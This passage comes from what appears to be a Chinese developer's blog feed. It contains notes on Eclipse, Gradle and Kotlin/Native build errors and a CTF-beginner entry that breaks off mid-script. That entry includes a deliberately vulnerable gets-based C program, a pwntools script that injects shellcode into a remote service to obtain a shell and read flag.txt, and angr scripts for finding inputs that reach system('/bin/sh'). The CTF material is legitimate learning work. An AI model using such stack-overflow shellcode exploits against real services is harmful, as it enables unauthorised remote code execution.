class="headerlink" title="Solution"></a>Solution</h3><p>安装 Eclipse 2022-12 然后安装 2022-12 版本的 Eclipse Web Developer Tools</p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Eclipse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>org.gradle.internal.remote.internal.MessageIOException: Could not write &#39;/127.0.0.1:&lt;random port&gt;&#39;</title>
      <link href="/2022/12/21/MessageIOException_Could_not_write_127.0.0.1/"/>
      <url>/2022/12/21/MessageIOException_Could_not_write_127.0.0.1/</url>
      
        <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>在跑 Kotlin test 的时候有的时候会遇到, 用的是 junit test  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Unexpected exception thrown.</span><br><span class="line">org.gradle.internal.remote.internal.MessageIOException: Could not write &#x27;/127.0.0.1:&lt;random port&gt;&#x27;.</span><br><span class="line">at org.gradle.internal.remote.internal.inet.SocketConnection.flush(SocketConnection.java:140)</span><br><span class="line">at org.gradle.internal.remote.internal.hub.MessageHub$ConnectionDispatch.run(MessageHub.java:333)</span><br><span class="line">at org.gradle.internal.concurrent.ExecutorPolicy$CatchAndRecordFailures.onExecute(ExecutorPolicy.java:64)</span><br><span class="line">at org.gradle.internal.concurrent.ManagedExecutorImpl$1.run(ManagedExecutorImpl.java:48)</span><br><span class="line">at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1130)</span><br><span class="line">at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:630)</span><br><span class="line">at org.gradle.internal.concurrent.ThreadFactoryImpl$ManagedThreadRunnable.run(ThreadFactoryImpl.java:61)</span><br><span class="line">at java.base/java.lang.Thread.run(Thread.java:832)</span><br><span class="line">Caused by: java.io.IOException: Connection reset by peer</span><br><span class="line">at java.base/sun.nio.ch.SocketDispatcher.write0(Native Method)</span><br><span class="line">at java.base/sun.nio.ch.SocketDispatcher.write(SocketDispatcher.java:54)</span><br><span class="line">at java.base/sun.nio.ch.IOUtil.writeFromNativeBuffer(IOUtil.java:113)</span><br><span class="line">at java.base/sun.nio.ch.IOUtil.write(IOUtil.java:58)</span><br><span class="line">at java.base/sun.nio.ch.IOUtil.write(IOUtil.java:50)</span><br><span class="line">at java.base/sun.nio.ch.SocketChannelImpl.write(SocketChannelImpl.java:506)</span><br><span class="line">at org.gradle.internal.remote.internal.inet.SocketConnection$SocketOutputStream.writeWithNonBlockingRetry(SocketConnection.java:279)</span><br><span class="line">at org.gradle.internal.remote.internal.inet.SocketConnection$SocketOutputStream.writeBufferToChannel(SocketConnection.java:267)</span><br><span class="line">at org.gradle.internal.remote.internal.inet.SocketConnection$SocketOutputStream.flush(SocketConnection.java:261)</span><br><span class="line">at org.gradle.internal.remote.internal.inet.SocketConnection.flush(SocketConnection.java:138)</span><br><span class="line">... 7 more</span><br><span class="line">&gt; Task :jvmTest FAILED</span><br><span class="line">Dec 21, 2022 5:24:30 PM org.junit.platform.launcher.core.EngineDiscoveryOrchestrator lambda$logTestDescriptorExclusionReasons$7</span><br><span class="line">INFO: 0 containers and 1 tests were Method or class mismatch</span><br><span class="line">FAILURE: Build failed with an exception.</span><br><span class="line">* What went wrong:</span><br><span class="line">Execution failed for task &#x27;:jvmTest&#x27;.</span><br><span class="line">&gt; Process &#x27;Gradle Test Executor 2&#x27; finished with non-zero exit value 1</span><br><span class="line">  This problem might be caused by incorrect test process configuration.</span><br><span class="line">  Please refer to the test execution section in the User Manual at https://docs.gradle.org/7.3/userguide/java_testing.html#sec:test_execution</span><br><span class="line">* Try:</span><br><span class="line">&gt; Run with --stacktrace option to get the stack trace.</span><br><span class="line">&gt; Run with --info or --debug option to get more log output.</span><br><span class="line">&gt; Run with --scan to get full insights.</span><br><span class="line">* Get more help at https://help.gradle.org</span><br><span class="line">BUILD FAILED in 2s</span><br></pre></td></tr></table></figure><p>类似这种的问题, 但是我写的操作不涉及任何网络读写  </p><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>在跑 test 的时候被程序主动 exit 了<br>复现代码:  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@Test</span><br><span class="line">fun a()&#123;</span><br><span class="line">    exitProcess(1)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>避免在 test 里直接 exit<br>说实话这种写法(指在 test 直接退出)有点蠢 XD</p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kotlin/Native lld-link: error: undefined symbol: std::__throw_bad_array_new_length()</title>
      <link href="/2022/10/20/kotlin-native-std-__throw_bad_array_new_length/"/>
      <url>/2022/10/20/kotlin-native-std-__throw_bad_array_new_length/</url>
      
        <content type="html"><![CDATA[<h2 id="0-问题"><a href="#0-问题" class="headerlink" title="0. 问题"></a>0. 问题</h2><p>在 GitHub Workflow 或者 本地运行 Kotlin&#x2F;Native 的 link 任务报错:<br>本地 &amp; GitHub 环境:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">os = Windows</span><br><span class="line">compiler = GCC 11.2.0</span><br></pre></td></tr></table></figure><p>以下为在 GitHub Workflow 上的日志片段</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">e: C:\Users\runneradmin\.konan\dependencies\llvm-11.1.0-windows-x64-essentials/bin/clang++ invocation reported errors</span><br><span class="line"></span><br><span class="line">The C:\Users\runneradmin\.konan\dependencies\llvm-11.1.0-windows-x64-essentials/bin/clang++ command returned non-zero exit code: 1.</span><br><span class="line">output:</span><br><span class="line">lld-link: error: undefined symbol: std::__throw_bad_array_new_length()</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; referenced by &lt;Linked Lib name&gt;.a(ThreadController.cpp.obj):(LibLoader::sendPluginException(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;))</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; referenced by &lt;Linked Lib name&gt;.a(ThreadController.cpp.obj):(LibLoader::ThreadController::submitJob(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;, std::<span class="keyword">function</span>&lt;void ()&gt;))</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; referenced by &lt;Linked Lib name&gt;.a(ThreadController.cpp.obj):(LibLoader::ThreadController::callThreadEnd(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;, std::<span class="keyword">function</span>&lt;void ()&gt;))</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; referenced 16 more <span class="built_in">times</span></span></span><br><span class="line">clang++: error: linker command failed with exit code 1 (use -v to see invocation)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Task :&lt;Proj name&gt;:linkDebugExecutableNative FAILED</span></span><br><span class="line">:&lt;Proj name&gt;:linkDebugExecutableNative (Thread[Execution worker for &#x27;:&#x27;,5,main]) completed. Took 3 mins 10.585 secs.</span><br></pre></td></tr></table></figure><h2 id="1-原因"><a href="#1-原因" class="headerlink" title="1. 原因"></a>1. 原因</h2><p>造成的原因是 Kotlin&#x2F;Native 是用 GCC 9.2.0 的(见 <a href="https://youtrack.jetbrains.com/issue/KT-51975/Native-lld-link-error-undefined-symbol-stdthrowbadarraynewlength">KT-51975</a>), 但是我在 Kotlin&#x2F;Native 里的 cintrop 里 link 了一个用 GCC 11.2.0 编译的静态库.</p><h2 id="2-解决方法"><a href="#2-解决方法" class="headerlink" title="2. 解决方法"></a>2. 解决方法</h2><p>用 GCC 10 &#x2F; 9 重新编译要 link 的静态库或者改用动态库</p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF 入门的一些笔记</title>
      <link href="/2022/10/14/PWN-wr1teups0/"/>
      <url>/2022/10/14/PWN-wr1teups0/</url>
      
        <content type="html"><![CDATA[<h2 id="shellcode-注入"><a href="#shellcode-注入" class="headerlink" title="shellcode 注入"></a>shellcode 注入</h2><p>需要解的程序, 目的是获取同目录下的 <code>flag.txt</code> 内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// chall.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;&lt;Text 2&gt; %p\n&quot;</span>, buf);</span><br><span class="line">gets(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> sample[<span class="number">20</span>];</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&lt;Text 1&gt;&quot;</span>);</span><br><span class="line">fgets(sample, <span class="keyword">sizeof</span>(sample) - <span class="number">1</span>, <span class="built_in">stdin</span>);</span><br><span class="line">vuln();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编译命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc chall.c -o chall -fno-stack-protector -z execstack</span><br></pre></td></tr></table></figure><p>可以注意 <code>execstack</code> 这一项.</p><p>一开始我本想用第二个 <code>gets</code> 溢出来重写 <code>$rbp</code> 寄存器到 <code>system</code> 的地址, 然后 <code>$rdi</code> 到 <code>/bin/sh</code> 来执行 <code>system(&quot;/bin/sh&quot;);</code> 以获取命令行, 但是问题出现在拿不到远程的 <code>system</code> 地址.</p><p>后来看了一眼网上, 可以用 <code>shellcode</code> 来解决</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># solve.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># lib = gdb.debug(&quot;&lt;local file&gt;&quot;)</span></span><br><span class="line">lib = remote(<span class="string">&quot;&lt;remote addr&gt;&quot;</span>, &lt;port&gt;)</span><br><span class="line"><span class="built_in">print</span>(lib.recv())</span><br><span class="line"><span class="comment"># 随便写点什么填充第一个输入</span></span><br><span class="line">lib.sendline(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">re = lib.recv()</span><br><span class="line"><span class="built_in">print</span>(re)</span><br><span class="line"><span class="comment"># 从第二个输出中获取第二个字符数组的地址</span></span><br><span class="line">addr = <span class="built_in">int</span>(re[-<span class="number">15</span>:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(re[-<span class="number">15</span>:-<span class="number">1</span>])</span><br><span class="line"><span class="comment"># 获取 bytes 类型的 system(&quot;/bin/sh&quot;); 的 shellcode</span></span><br><span class="line">bash_bytes = asm(shellcraft.amd64.linux.sh(),arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(bash_bytes))</span><br><span class="line"><span class="comment"># 填充 shellcode 到第二个字符数组, 同时用 overflow 重写 `$rbp` 到之前获取的第二个字符数组开头</span></span><br><span class="line">lib.sendline(bash_bytes + <span class="string">b&quot;\x00&quot;</span> * (<span class="number">120</span> - <span class="built_in">len</span>(bash_bytes)) + p64(addr, endian=<span class="string">&quot;little&quot;</span>))</span><br><span class="line"><span class="comment"># 获取 flag.txt 内容</span></span><br><span class="line">lib.sendline(<span class="string">b&quot;cat flag.txt&quot;</span>)</span><br><span class="line">lib.recv()</span><br></pre></td></tr></table></figure><h2 id="angr-破解输入"><a href="#angr-破解输入" class="headerlink" title="angr 破解输入"></a>angr 破解输入</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// chall.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> key[<span class="number">50</span>] = <span class="string">&quot;_________________&lt;Text_1&gt;______________\xC0\xDE&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> input[<span class="number">50</span>];</span><br><span class="line">fgets(input, <span class="keyword">sizeof</span>(input) - <span class="number">1</span>, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strlen</span>(input) == <span class="built_in">strlen</span>(key)) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(key); i++) &#123;</span><br><span class="line"><span class="keyword">if</span> ((input[i] ^ <span class="number">0x27</span>) != key[i]) &#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是要输入一个合适的字符串, 使程序走到 system 这一行<br>然后我就想到了可以用 Angr 来爆破输入的字符串<br>编译命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc chall.c -o chall</span><br></pre></td></tr></table></figure><p>解决脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># solve.py</span></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># 程序地址</span></span><br><span class="line">path_to_binary = <span class="string">&quot;./chall&quot;</span></span><br><span class="line"><span class="comment"># 载入程序</span></span><br><span class="line">project = angr.Project(path_to_binary)</span><br><span class="line"><span class="comment"># 入口点为默认程序入口点</span></span><br><span class="line">initial_state = project.factory.entry_state()</span><br><span class="line"><span class="comment"># 初始化模拟器</span></span><br><span class="line">simulation = project.factory.simgr(initial_state)</span><br><span class="line"><span class="comment"># system 那一行的地址 (0x400000 开头是因为 Angr 的 pie 地址默认是 0x400000)</span></span><br><span class="line">print_good_address = <span class="number">0x400924</span> </span><br><span class="line"><span class="comment"># 寻找解决方案</span></span><br><span class="line">simulation.explore(find=print_good_address)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># 输出输入值</span></span><br><span class="line">    solution = solution_state.posix.dumps(sys.stdin.fileno())</span><br><span class="line">    <span class="built_in">print</span>(solution)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 提交解决方案地址</span></span><br><span class="line">lib = remote(<span class="string">&quot;&lt;remote addr&gt;&quot;</span>, <span class="number">1111</span>)</span><br><span class="line"><span class="comment"># 上一步获得的值</span></span><br><span class="line">lib.sendline(<span class="string">b&#x27;cNB@H\x07&#125;FDDFN\x07NT\x07SOB\x07EBTS\x07dtb\x07WUHABTTHU\t\xe7\xf9\x00\x00\x00\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">lib.interactive()</span><br></pre></td></tr></table></figure><h2 id="angr-2"><a href="#angr-2" class="headerlink" title="angr - 2"></a>angr - 2</h2><p>当我们遇到像下面这种一长串来验证一个<code>FLAG</code>全局变量的时候(<a href="https://github.com/Nambers/ctf-writeups/blob/main/WolvCTF-2023/Reverse-Homework_Help-Easy-Medium/solve.md">WolvCTF23-Rev-Homework_help</a>):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __stack_chk_fail(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">long</span> lVar2;</span><br><span class="line">  uint uVar3;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  uint local_15c;</span><br><span class="line">  uint auStack344 [<span class="number">2</span>];</span><br><span class="line">  undefined8 local_150;</span><br><span class="line">  undefined8 local_148;</span><br><span class="line">  undefined8 local_140;</span><br><span class="line">  undefined8 local_138;</span><br><span class="line">  undefined8 local_130;</span><br><span class="line">  undefined8 local_128;</span><br><span class="line">  undefined8 local_120;</span><br><span class="line">  undefined8 local_118;</span><br><span class="line">  undefined8 local_110;</span><br><span class="line">  undefined8 local_108;</span><br><span class="line">  undefined8 local_100;</span><br><span class="line">  undefined8 local_f8;</span><br><span class="line">  undefined8 local_f0;</span><br><span class="line">  undefined8 local_e8;</span><br><span class="line">  undefined8 local_e0;</span><br><span class="line">  __jmp_buf_tag local_d8;</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  auStack344[<span class="number">1</span>] = <span class="number">0x14</span>;</span><br><span class="line">  local_150 = <span class="number">0x1200000017</span>;</span><br><span class="line">  local_148 = <span class="number">0x500000001d</span>;</span><br><span class="line">  local_140 = <span class="number">0x5d00000046</span>;</span><br><span class="line">  local_138 = <span class="number">0x4100000042</span>;</span><br><span class="line">  local_130 = <span class="number">0x330000006c</span>;</span><br><span class="line">  local_128 = <span class="number">0x5a0000005d</span>;</span><br><span class="line">  local_120 = <span class="number">0x3a0000000e</span>;</span><br><span class="line">  local_118 = <span class="number">0x410000006a</span>;</span><br><span class="line">  local_110 = <span class="number">0x5700000040</span>;</span><br><span class="line">  local_108 = <span class="number">0x3400000008</span>;</span><br><span class="line">  local_100 = <span class="number">0xb0000003c</span>;</span><br><span class="line">  local_f8 = <span class="number">0x3400000003</span>;</span><br><span class="line">  local_f0 = <span class="number">0x4600000028</span>;</span><br><span class="line">  local_e8 = <span class="number">0x530000005f</span>;</span><br><span class="line">  local_e0 = <span class="number">0x5000000010</span>;</span><br><span class="line">  local_15c = <span class="number">0x36</span>;</span><br><span class="line">  iVar1 = _setjmp(&amp;local_d8);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    lVar2 = <span class="number">0</span>;</span><br><span class="line">    uVar3 = <span class="number">0x41</span>;</span><br><span class="line">    <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">      local_15c = local_15c ^ uVar3;</span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">int</span>)(<span class="type">char</span>)FLAG[lVar2] != local_15c) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">        __longjmp_chk(&amp;local_d8,<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      lVar2 = lVar2 + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (lVar2 == <span class="number">0x20</span>) <span class="keyword">break</span>;</span><br><span class="line">      uVar3 = auStack344[lVar2];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// addr: 0x13f5</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Well Done.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// addr: 0x1414</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nope.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (local_10 == *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  __stack_chk_fail();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果不想手动分析(这个分析相对来说也不是很困难?)也可以用 Angr  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># solve.py</span></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_successful</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="comment"># 检查 stdout 有没有 Well Done 字段</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Well Done&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">should_abort</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="comment"># 检查控制台 stdout 有没有 Nope 字段</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Nope&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载二进制文件, 当我们分析的二进制没有受外部库显著的影响时, 可以关掉 auto_load_libs</span></span><br><span class="line">project = angr.Project(<span class="string">&quot;F:/Downloads/homework_help&quot;</span>, auto_load_libs = <span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(project.loader.find_symbol(<span class="string">&quot;__stack_chk_fail&quot;</span>).rebased_addr)</span><br><span class="line"><span class="comment"># 从这个方法开始执行</span></span><br><span class="line">state = project.factory.blank_state(addr=project.loader.find_symbol(<span class="string">&quot;__stack_chk_fail&quot;</span>).rebased_addr)</span><br><span class="line"><span class="comment"># 把 FLAG 变量当作一个 solver 的变量, 我们目的就是让 Angr 构造一个合适的 FLAG 来达到 is_successful 条件</span></span><br><span class="line"><span class="comment"># 第一个是自定义名字, 可以随意, 第二个参数是长度, 通过 Ghidra 可以看到程序中为 32 bytes 长, 也就是 32 * 8 bits 长</span></span><br><span class="line">flag = state.solver.BVS(<span class="string">&#x27;FLAG&#x27;</span>, <span class="number">32</span> * <span class="number">8</span>)</span><br><span 